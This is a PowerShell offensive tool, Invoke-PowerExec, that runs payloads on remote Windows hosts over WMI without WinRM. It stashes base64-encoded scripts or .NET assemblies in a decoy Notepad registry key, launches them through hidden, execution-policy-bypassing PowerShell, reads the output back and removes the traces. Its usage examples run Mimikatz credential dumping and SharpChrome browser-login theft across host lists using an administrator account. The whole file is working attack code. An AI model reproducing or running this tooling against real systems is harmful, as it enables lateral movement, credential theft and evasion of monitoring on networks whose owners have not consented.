function Invoke-PowerExec {
<#
.SYNOPSIS
    Run a payload on remote hosts and get the output.

    Author: Timothée MENOCHET (@synetis)

.DESCRIPTION
    Invoke-PowerExec uploads a payload on a remote host over WMI, runs it and returns the output.

.NOTES
    Invoke-PowerExec does NOT require PowerShell Remoting or WinRM to work and only uses Windows Management Instrumentation (WMI).

.PARAMETER Type
    Specify the payload type (PSScript, NETAssembly).

.PARAMETER File
    Specify the paylaod file to run.

.PARAMETER Arguments
    Specify the payload arguments.

.PARAMETER Hosts
    Specify the target hosts.

.PARAMETER Credential
    Specify the privileged account to use.

.EXAMPLE
	PS C:\> . .\Invoke-PowerExec.ps1
    PS C:\> Invoke-PowerExec -Type PSScript -File .\Invoke-Mimikatz.ps1 -Arguments 'Invoke-Mimikatz -DumpCreds' -Hosts $(gc hosts.txt) -Credential ADATUM\Administrator

.EXAMPLE
    PS C:\> Invoke-PowerExec -Type NETAssembly -File .\SharpChrome.exe -Arguments 'logins','/unprotect','/format:table' -Hosts '192.168.0.1','192.168.0.2' -Credential ADATUM\Administrator
#>

	Param (
		[Parameter(Mandatory=$True)]
		[ValidateSet("PSScript","NETAssembly")]
		[String]$Type,
		
		[ValidateNotNullOrEmpty()]
		[String]
		$File,

		[ValidateNotNullOrEmpty()]
		[String[]]
		$Arguments = $null,
		
		[Parameter(ValueFromPipeline=$True)]
		[ValidateNotNullOrEmpty()]
		[String[]]
		$Hosts = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty
	)

	ForEach($ComputerName in $Hosts) {
		Write-Host "`n[*] Host: $ComputerName"
		If($Type -eq 'PSScript') {
			Invoke-PSScriptExec -File $File -Arguments $Arguments -ComputerName $ComputerName -Credential $Credential
		}
		ElseIf($Type -like 'NETAssembly') {
			Invoke-NETAssemblyExec -File $File -Arguments $Arguments -ComputerName $ComputerName -Credential $Credential
		}
	}
}

function Invoke-PSScriptExec {

	Param (
		[ValidateNotNullOrEmpty()]
		[String]
		$ComputerName = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty,

		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[String]
		$File,
		
		[String[]]
		$Arguments = $null
	)

	# Encode the payload and store it
	$bytes = [IO.File]::ReadAllBytes((Resolve-Path $File))
	$RegValue = [System.Convert]::ToBase64String($bytes)
	$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
	$RegHive = 2147483650
	$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
	$RegKey = 'RunMe'
	Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name SetStringValue $RegHive, $RegPath, $RegValue, $RegKey -ComputerName $ComputerName -Credential $Credential | Out-Null

	# Retrieve the payload and run it
	$Script = '$EncCode = (Get-ItemProperty -Path "' + $RegistryPath + '").' + "$RegKey" + '; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncCode)) | Invoke-Expression; ' + "$Arguments"
	$EncScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Script))
	$Command = "powershell -Version 2 -Enc $EncScript"
	Invoke-WMIExec -Command $Command -ComputerName $ComputerName -Credential $Credential

	# Remove the payload
	Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
}

function Invoke-NETAssemblyExec {

	Param (
		[ValidateNotNullOrEmpty()]
		[String]
		$ComputerName = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty,

		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[String]
		$File,
		
		[String[]]
		$Arguments = $null
	)

	# Encode the payload and store it
	$bytes = [IO.File]::ReadAllBytes((Resolve-Path $File))
	$RegValue = [System.Convert]::ToBase64String($bytes)
	$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
	$RegHive = 2147483650
	$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
	$RegKey = 'RunMe'
	Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name SetStringValue $RegHive, $RegPath, $RegValue, $RegKey -ComputerName $ComputerName -Credential $Credential | Out-Null

	# Retrieve the payload and run it
	$Arguments = ($Arguments -join '","')
	$Script = '$EncCode = (Get-ItemProperty -Path "' + $RegistryPath + '").' + "$RegKey" + '; $Code = [System.Convert]::FromBase64String($EncCode); $Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = "' + $Arguments + '"; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
	$EncScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Script))
	$Command = "powershell -Enc $EncScript"
	Invoke-WMIExec -Command $Command -ComputerName $ComputerName -Credential $Credential

	# Remove the payload
	Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
}

function Invoke-WMIExec {

	Param (
		[ValidateNotNullOrEmpty()]
		[String]
		$ComputerName = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[System.Management.Automation.PSCredential]
		[System.Management.Automation.Credential()]
		$Credential = [System.Management.Automation.PSCredential]::Empty,

		[Parameter(Mandatory=$true)]
		[ValidateNotNullOrEmpty()]
		[String]
		$Command
	)

	# Run the command and store the output
	$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Notepad'
	$RegHive = 2147483650
	$RegPath = 'SOFTWARE\\Microsoft\\Notepad'
	$RegKey = 'ReadMe'
	$Script = '$Output = ' + "$Command" + ' | Out-String; $EncOutput = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Output)); New-ItemProperty -Path ' + "'$RegistryPath'" + ' -Name ' + "'$RegKey'" + ' -Value $EncOutput -PropertyType String -Force;'
	$Command = 'powershell.exe -W Hidden -NonI -NoP -Exec Bypass -Command ' + "$Script"
	$Process = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $Command -ComputerName $ComputerName -Credential $Credential
	$ProcessId = $Process.ProcessId
	Do {
		Start-Sleep -m 1000
	} Until ((Get-WMIobject -Class Win32_process -Filter "ProcessId='$ProcessId'" -ComputerName $ComputerName -Credential $Credential | Where {$_.Name -eq "powershell.exe"}).ProcessID -eq $null)

	# Retrieve the command output
	$EncOutput = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential
	$Output = [System.Convert]::FromBase64String($EncOutput.sValue)
	$Output = [System.Text.Encoding]::Unicode.GetString($Output)
	Write-Host $Output
	Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $RegHive, $RegPath, $RegKey -Computer $ComputerName -Credential $Credential | Out-Null
}
